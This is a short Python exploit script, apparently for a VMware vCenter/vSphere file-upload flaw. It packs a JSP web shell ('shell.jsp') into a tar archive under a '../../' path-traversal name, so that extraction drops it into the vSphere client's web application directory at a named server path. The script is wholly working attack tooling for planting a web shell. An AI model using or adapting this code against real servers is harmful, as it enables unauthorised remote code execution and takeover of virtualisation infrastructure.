'''
Author         : Sp4ce
Date           : 2021-02-26 00:36:38
LastEditors    : Sp4ce
LastEditTime   : 2021-02-26 22:46:55
Description    : Challenge Everything.
'''

import tarfile, os

# get script work path
WORK_PATH = os.path.split(os.path.realpath(__file__))[0]

# init payload path
WINDOWS_PAYLOAD = WORK_PATH + "/payload/Windows.tar"
LINUX_DEFAULT_PAYLOAD = WORK_PATH + "/payload/Linux.tar"
LINUX_RANDOM_PAYLOAD_SOURCE = WORK_PATH + '/payload/Linux/shell.jsp'
#LINUX_RANDOM_PAYLOAD_SOURCE = "D:\\sourceCode\\vSphereH5\\h5ngc.war"
LINUX_RANDOM_PAYLOAD_TARFILE = WORK_PATH + "/payload/Linux_Random.tar"


def make_traversal_path(path, level=2):
    traversal = ".." + "/"
    fullpath = traversal * level + path
    return fullpath.replace("\\", "/").replace("//", "/")


def archive(file, path):
    tarf = tarfile.open(LINUX_RANDOM_PAYLOAD_TARFILE, "w")
    fullpath = make_traversal_path(path, level=2)
    print("[+] Adding " + file + " as " + fullpath + " to archive")
    tarf.add(file, fullpath)
    tarf.close()


archive(
    LINUX_RANDOM_PAYLOAD_SOURCE,
    #"/usr/lib/vmware-vsphere-ui/plugin-packages/root-app/plugins/h5ngc.war",
    "/usr/lib/vmware-vsphere-client/server/work/deployer/s/global/29/0/container-app-war.war/assets/444.jsp"
)
